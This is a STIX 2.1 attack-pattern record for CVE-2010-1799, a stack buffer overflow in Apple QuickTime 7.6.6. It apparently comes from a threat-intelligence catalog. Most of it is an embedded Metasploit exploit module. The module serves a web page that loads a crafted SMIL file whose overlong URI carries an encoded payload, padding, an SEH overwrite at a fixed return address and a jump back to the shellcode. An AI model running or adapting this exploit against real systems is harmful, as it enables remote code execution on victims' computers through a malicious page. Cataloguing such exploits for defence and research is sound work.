{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f152d902-8974-49bb-8575-22a5abef635b",
    "created": "2024-08-14T16:41:22.595057Z",
    "modified": "2024-08-14T16:41:22.595061Z",
    "name": "Apple QuickTime 7.6.6 Invalid SMIL URI Buffer Overflow",
    "description": " This module exploits a buffer overflow in Apple QuickTime 7.6.6. When processing a malformed SMIL uri, a stack-based buffer overflow can occur when logging an error message. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/apple_quicktime_smil_debug.rb",
            "external_id": "apple_quicktime_smil_debug.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1799"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20100729143247/http://secunia.com:80/advisories/40729"
        },
        {
            "source_name": "reference",
            "url": "http://support.apple.com/kb/HT4290"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking # needs more testing/targets to be Great\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Seh\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :javascript => true,\n  #  :rank       => NormalRanking, # reliable memory corruption\n  #  :vuln_test  => nil,\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apple QuickTime 7.6.6 Invalid SMIL URI Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Apple QuickTime\n        7.6.6. When processing a malformed SMIL uri, a stack-based buffer\n        overflow can occur when logging an error message.\n      },\n      'Author'         =>\n        [\n          'Krystian Kloskowski',  # original discovery\n          'jduck'                 # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1799' ],\n          [ 'OSVDB', '66636'],\n          [ 'BID', '41962' ],\n          [ 'URL', 'http://web.archive.org/web/20100729143247/http://secunia.com:80/advisories/40729' ],\n          [ 'URL', 'http://support.apple.com/kb/HT4290' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 640, # 716 - 63 - 8 - 5\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x22\\x25\\x26\\x27\\x2b\\x2f\\x3a\\x3c\\x3e\\x3f\\x40\\x5c\",\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          #[ 'Automatic', { } ],\n          [ 'Apple QuickTime Player 7.6.6',\n            {\n              'Ret' => 0x66801042 # p/p/r from QuickTime.qts (v7.66.71.0)\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-08-12',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(client, request)\n\n    return if ((p = regenerate_payload(client)) == nil)\n\n    if (request['User-Agent'] =~ /QuickTime/i or request.uri =~ /\\.smil$/)\n      print_status(\"Sending exploit SMIL (target: #{target.name})\")\n\n      # This is all basically filler on the browser target because we can't\n      # expect the SEH to be in a reliable place across multiple browsers.\n      # Heap spray ftw.\n\n      off = 716\n      start = \"cHTTPDhlr_SetURL - url doesn't start with http:// or http1:// '\"\n\n      scheme = rand_text_alphanumeric(5)\n\n      sploit = ''\n      sploit << scheme\n      sploit << \"://\"\n\n      # payload\n      sploit << p.encoded\n\n      # pad to SEH\n      sploit << rand_text_english(off - sploit.length - start.length)\n\n      # seh frame\n      sploit << generate_seh_record(target.ret)\n\n      # jmp back to payload\n      distance = off + 8 - (8 + start.length)\n      sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n\n      # force exception while writing\n      sploit << rand_text(1024) * 15\n\n      smil = %Q|<smil xmlns=\"http://www.w3.org/2001/SMIL20/Language\">\n<body>\n<img src=\"#{sploit}\" />\n</body>\n</smil>\n|\n      send_response(client, smil, { 'Content-Type' => \"application/smil\" })\n\n    else\n      print_status(\"Sending initial HTML\")\n\n      shellcode = Rex::Text.to_unescape(p.encoded)\n      url =  ((datastore['SSL']) ? \"https://\" : \"http://\")\n      url << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(client.peerhost) : datastore['SRVHOST'])\n      url << \":\" + datastore['SRVPORT'].to_s\n      url << get_resource\n\n      fname = rand_text_alphanumeric(4)\n\n      content =  \"<html><body>\"\n      content << <<-ENDEMBED\n          <OBJECT\n          CLASSID=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\"\n          WIDTH=\"1\"\n          HEIGHT=\"1\"\n          CODEBASE=\"http://www.apple.com/qtactivex/qtplugin.cab\">\n          <PARAM name=\"SRC\"        VALUE = \"#{url}/#{fname}.smil\">\n          <PARAM name=\"QTSRC\"      VALUE = \"#{url}/#{fname}.smil\">\n          <PARAM name=\"AUTOPLAY\"   VALUE = \"true\"               >\n          <PARAM name=\"TYPE\"       VALUE = \"video/quicktime\"    >\n          <PARAM name=\"TARGET\"     VALUE = \"myself\"             >\n          <EMBED\n            SRC        = \"#{url}/#{fname}.qtl\"\n            QTSRC      = \"#{url}/#{fname}.qtl\"\n            TARGET     = \"myself\"\n            WIDTH      = \"1\"\n            HEIGHT     = \"1\"\n            AUTOPLAY   = \"true\"\n            PLUGIN     = \"quicktimeplugin\"\n            TYPE       = \"video/quicktime\"\n            CACHE      = \"false\"\n            PLUGINSPAGE= \"http://www.apple.com/quicktime/download/\" >\n          </EMBED>\n          </OBJECT>\n        ENDEMBED\n      content << \"</body></html>\"\n\n      send_response(client, content, { 'Content-Type' => \"text/html\" })\n    end\n\n    # Handle the payload\n    handler(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-08-12",
    "x_mitre_platforms": [
        "win'"
    ]
}